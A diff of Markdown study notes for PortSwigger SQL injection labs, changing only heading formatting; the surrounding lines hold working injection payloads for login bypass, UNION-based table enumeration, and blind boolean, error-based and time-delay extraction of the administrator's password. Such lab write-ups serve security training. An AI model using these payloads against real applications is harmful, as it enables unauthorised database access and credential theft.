@@ -4,9 +4,8 @@
    b. https://portswigger.net/web-security/sql-injection/blind
    
 2. https://portswigger.net/web-security/sql-injection/cheat-sheet
-## Labs:
-## 1. SQL injection vulnerability in WHERE clause allowing retrieval of hidden data
 
+## **1. SQL injection vulnerability in WHERE clause allowing retrieval of hidden data**
 SQL injection attack that causes the application to display one or more unreleased products.
 
 	SELECT * FROM products WHERE category = ' OR 1=1--
@@ -16,8 +15,7 @@ SQL injection attack that causes the application to display one or more unreleas
 ```
 
 
-## 2. SQL injection vulnerability allowing login bypass
-
+## **2. SQL injection vulnerability allowing login bypass**
 SQL injection attack that logs in to the application as the `administrator` user.
 
 ```
@@ -25,8 +23,7 @@ SQL injection attack that logs in to the application as the `administrator` us
 ```
 
 
-## 3. SQL injection querying the database type and version on Oracle
-
+## **3. SQL injection querying the database type and version on Oracle**
  ```
  'UNION SELECT'a','b' FROM dual--
 ```
@@ -37,8 +34,7 @@ SQL injection attack that logs in to the application as the `administrator` us
 ```
 
 
-## 4. SQL injection attack, querying the database type and version on MySQL and Microsoft
-
+## **4. SQL injection attack, querying the database type and version on MySQL and Microsoft**
 In Microsoft database we can payload without to specify FROM table, instead we can comment with "#" right after selected columns:
  ```
  'UNION SELECT'a','b'#
@@ -50,8 +46,7 @@ In Microsoft database we can payload without to specify FROM table, instead we c
  ```
 
 
-## 5. SQL injection attack, listing the database contents on non-Oracle databases
-
+## **5. SQL injection attack, listing the database contents on non-Oracle databases**
 ```
 ' UNION SELECT 'abc','def'--
 ```
@@ -72,8 +67,7 @@ Replacing the table and column names to retrieve the usernames and passwords for
 ```
 
 
-## 6. SQL injection attack, listing the database contents on Oracle
-
+## **6. SQL injection attack, listing the database contents on Oracle**
 ```
 ' UNION SELECT 'a', 'b' FROM all_tables--
 ```
@@ -91,8 +85,7 @@ Replacing the table and column names to retrieve the usernames and passwords for
 ```
 
 
-## 7. SQL injection UNION attack, finding a column containing text
-
+## **7. SQL injection UNION attack, finding a column containing text**
 ```
 ' UNION SELECT 'qHuBUo',null,null FROM information_schema.tables--
 ```
@@ -106,8 +99,7 @@ Replacing the table and column names to retrieve the usernames and passwords for
 ```
 
 
-## 8. SQL injection UNION attack, retrieving data from other tables
-
+## **8. SQL injection UNION attack, retrieving data from other tables**
 ```
 ' UNION SELECT null,null--
 ```
@@ -125,8 +117,7 @@ Replacing the table and column names to retrieve the usernames and passwords for
 ```
 
 
-## 9. SQL injection UNION attack, retrieving multiple values in a single column
-
+## **9. SQL injection UNION attack, retrieving multiple values in a single column**
 ```
 ' UNION SELECT 'a',null--   ERROR 500 (first position is not string based)
 ```
@@ -147,8 +138,7 @@ In order to retrieve data we need to do that only on the second position using a
 			
 
 
-## 10. Blind SQL injection with conditional responses(MYSQL)
-
+## **10. Blind SQL injection with conditional responses(MYSQL)**
 We will perform injection based on the session cookie (response = welcome back message)
 ```
 Cookie: TrackingId=XZqKxHXKgUbxQYVh
@@ -194,8 +184,7 @@ Cookie: TrackingId=XZqKxHXKgUbxQYVh' AND(SELECT SUBSTRING(password,§1§,1) FRO
 ```
 
 
-## 11. Blind SQL injection with conditional errors(ORACLE)
-
+## **11. Blind SQL injection with conditional errors(ORACLE)**
 We will perform injection based on the session cookie (internal server error: positive response) 
 ```
 Cookie: TrackingId=XZqKxHXKgUbxQYVh
@@ -243,8 +232,7 @@ Cookie: TrackingId=XZqKxHXKgUbxQYVh' AND(SELECT CASE WHEN SUBSTR(password,§1§,
 ```
 
 
-## 12.  Visible error-based SQL injection
-
+## **12.  Visible error-based SQL injection**
 ```
 TrackingId=ogAZZfxtOKUELbuJ'
 ```
@@ -292,7 +280,7 @@ TrackingId=' AND 1=CAST((SELECT username FROM users LIMIT 1) AS int)--
  The error message now leaks the first password from the `users` table which is the actual password used for *administrator*:
 
 
-## 13. Blind SQL injection with time delays
+## **13. Blind SQL injection with time delays**
 ![[Pasted image 20240629015925.png]]
 
 Confirm that parameter is vulnerable to injection
@@ -301,8 +289,7 @@ TrackingId=ogAZZfxtOKUELbuJ' || (SELECT pg_sleep(10)) --
 ```
 
 
-## 14. Blind SQL injection with time delays and information retrieval
-
+## **14. Blind SQL injection with time delays and information retrieval**
 The results of the SQL query are not returned, and the application does not respond any differently based on whether the query returns any rows or causes an error. However, since the query is executed synchronously, it is possible to trigger conditional time delays to infer information.
 
 Confirm that the parameter is vulnerable to injection
@@ -333,4 +320,4 @@ Password enumeration
 || (SELECT CASE WHEN (username='administrator' AND SUBSTRING(password,§1§,1)='§a§') THEN pg_sleep(10) else pg_sleep(-1) END FROM users)--
 ```
 
-## 15. Blind SQL injection with out-of-band interaction
+## **15. Blind SQL injection with out-of-band interaction**
